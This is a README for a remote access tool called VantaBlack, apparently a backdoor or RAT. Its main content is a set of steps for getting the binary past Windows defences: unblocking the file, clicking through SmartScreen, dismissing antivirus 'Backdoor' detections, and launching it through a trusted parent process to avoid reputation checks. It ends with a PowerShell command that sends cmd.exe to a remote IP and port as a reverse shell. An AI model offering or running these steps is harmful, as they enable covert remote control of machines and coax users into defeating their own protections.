# Project VantaBlack - Remote Access & Network Research Utility

VantaBlack is a lightweight, netcat-compatible remote administration tool designed for red-teaming, network diagnostics, and remote shell management. 

> **Disclaimer:** This tool is for educational and authorized security testing purposes only. The author is not responsible for any misuse or damage caused by this utility.

## ✨ Features
* **Remote Shell Access:** Establish stable remote sessions via netcat-style listeners.
* **Lightweight:** Single-binary execution with minimal dependencies.
* **Low Footprint:** Designed to run efficiently in constrained environments.

---

## 🛡️ Windows Security & "Unknown Publisher" Warnings

This project is an independent, unsigned security utility. Because it lacks a commercial EV Code Signing certificate, Windows SmartScreen will flag the `.exe` as an **"Unknown Publisher."** Additionally, due to its remote-access capabilities, some Antivirus engines may flag it as a "Generic RAT" or "Backdoor."

### How to Execute Safely:
To run the binary without the "Windows protected your PC" block:

1. **Unblock the File:**
   Right-click `[YourApp].exe` > **Properties** > Check **Unblock** > **Apply**.
   
2. **SmartScreen Bypass:**
   On the blue "Windows protected your PC" popup, click **More Info** and then **Run Anyway**.

3. **Command Line (Recommended):**
   Launch via a trusted parent process to avoid some UI-based reputation checks:
   ```powershell
   Start-Process -FilePath ".\[YourApp].exe" -ArgumentList "-e cmd.exe [YourIP] [Port]"
